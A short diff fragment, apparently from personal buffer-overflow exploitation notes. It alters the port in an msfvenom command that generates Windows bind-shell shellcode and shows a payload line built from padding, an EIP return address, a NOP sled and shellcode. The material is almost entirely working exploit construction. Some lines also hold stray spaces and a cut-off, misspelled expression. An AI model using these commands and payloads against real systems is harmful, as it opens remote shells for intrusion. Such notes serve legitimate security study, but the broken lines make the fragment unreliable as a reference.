@@ -3,7 +3,7 @@ Buffer Overflows
 
 msfvenom -a x86 --platform windows -p windows/ shell_bind_tcp LPORT=4321 - b '\x00\x11\x22\x33\x44' -f python
 
-msfvenom -p windows/shell_bind_tcp LPORT=4321 -b '\x00\x11\x22\x33\x44' -f c
+msfvenom -p windows/shell_bind_tcp LPORT=1234 -b '\x00\x11\x22\x33\x44' -f c
 
 junk = "\x41" * pattern_ofset + '\x11\x22\x33\x44'+ '\x90' * 20 + shellcode +'\x42' * (buffer_size-pattern_ofset-4-20-
                                      EIP
